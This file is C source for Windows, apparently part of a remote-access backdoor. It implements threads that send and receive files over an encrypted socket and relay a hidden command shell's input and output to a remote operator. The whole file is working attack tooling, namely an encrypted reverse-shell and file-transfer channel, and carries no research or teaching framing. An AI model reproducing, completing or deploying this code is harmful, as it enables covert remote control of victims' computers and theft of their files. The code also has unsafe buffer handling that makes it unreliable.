#include "pipes.h"
SOCKET sockt;
DWORD WINAPI downloadPipe(LPVOID lPparam) {
	PData_U data = (PData_U)lPparam; //gets arguments
	downloadFile(data->fpointer);
	return 0;
}
void downloadFile(FILE * pfile) {
	//general setup of vars
	DWORD dwWritten = 0;
	char buff[MAX_READ];
	ZeroMemory(buff, sizeof(buff));
	char encrypted[DEFAULT_BUFLEN];

	for (;;) {

		//recv message length to recv
		char sizechar[4];
		ZeroMemory(sizechar, sizeof(sizechar));
		recv(sockt, sizechar, sizeof(sizechar), MSG_WAITALL);
		int size = atoi(sizechar);

		//recv file data
		recv(sockt, encrypted, size, MSG_WAITALL);

		//decrypt message
		int len = decrypt(encrypted, size, buff);

		// write data to file
		fwrite(buff, 1, len, pfile);

		//if data recv less than max recv then EOF must have been reached
		if (len < MAX_READ) {
			break;
		}



	}
}
DWORD WINAPI uploadPipe(LPVOID lPparam) {
	PData_U data = (PData_U)lPparam; //gets thread arguments

	uploadFile(data->fpointer);

	return 0;
}
void uploadFile(FILE * file_OUT_Rd) {
	// general setup of variables
	DWORD dwWritten = 0;
	char buff[MAX_READ];
	ZeroMemory(buff, sizeof(buff));
	char encrypted[DEFAULT_BUFLEN];
	
	//main loop
	for (;;) {
		int amtRead = fread(buff, 1, MAX_READ, file_OUT_Rd);
		if (amtRead == 0)
			break;

		int bytesencrypt = encrypt(buff, amtRead, encrypted); //encrypt data

		char sizechar[4];
		ZeroMemory(sizechar, sizeof(sizechar));
		int written = sprintf(sizechar, "%d", bytesencrypt); //notifys how mnay bytes are being sent
		send(sockt, sizechar, sizeof(sizechar), 0);

		//send actual data
		 WriteFile((HANDLE)sockt, encrypted, bytesencrypt, &dwWritten, NULL);

		
	}
}

DWORD WINAPI shellPipe(LPVOID lPparam) {
	PData_S data = (PData_S)lPparam; //gets thread arguments

	for (;;) {
		if (WaitForSingleObject(data->hParentThread, 0) == WAIT_OBJECT_0) //cmd handle closed
			return 0; //exit thread 
		writeSocket(data->OUT_Rd);
		readSocket(data->IN_Wr); 

	}
	return 0;
}

void writeSocket(HANDLE ChildStd_OUT_Rd) { //FUNC TO WRITE TO SOCKET HANDLE
	DWORD bytesavail, dwWritten, dwRead = 0;
	char buff[MAX_READ];
	ZeroMemory(buff, sizeof(buff));
	BOOL bSuccess = FALSE;
	char encrypted[DEFAULT_BUFLEN];
	for (;;) {
		PeekNamedPipe(ChildStd_OUT_Rd, NULL, 0, NULL, &bytesavail, 0);
		if (bytesavail) {
			//read data from child handle
			bSuccess = ReadFile(ChildStd_OUT_Rd, buff, MAX_READ, &dwRead, NULL);
			if (!bSuccess || dwRead == 0) break; //no data read or read failed

												 //encrypt data
			int bytesencrypt = encrypt(buff, dwRead, encrypted); //encrypt data

			char sizechar[4];
			ZeroMemory(sizechar, sizeof(sizechar));
			int written = sprintf(sizechar, "%d", bytesencrypt); //notifys how mnay bytes are being sent
			send(sockt, sizechar, sizeof(sizechar), 0);

			//send actual data
			if (!(WriteFile((HANDLE)sockt, encrypted, bytesencrypt, &dwWritten, NULL)))
				break; // didnt properly write
		}
		else break;
	}

}

void readSocket(HANDLE ChildStd_IN_Wr) { //FUNC FOR READING FROM SOCKET HANDLE
	DWORD  dwRead, dwWritten;
	DWORD bytesavail = 0;
	char buff[DEFAULT_BUFLEN];
	ZeroMemory(buff, sizeof(buff));
	BOOL bSuccess = FALSE;
	char decrypted[MAX_READ];
	ZeroMemory(decrypted, MAX_READ);
	for (;;) {
		ioctlsocket(sockt, FIONREAD, &bytesavail);
		if (bytesavail) {
			bSuccess = ReadFile((HANDLE)sockt, buff, sizeof(buff), &dwRead, NULL);
			if (!bSuccess || dwRead == 0) break; //if no data is read or readfile fails then break

			int bytesdecrypt = decrypt(buff, dwRead, decrypted); //decrypt input
			bSuccess = WriteFile(ChildStd_IN_Wr, decrypted, bytesdecrypt, &dwWritten, NULL);
		}
		else
			break;
	}
}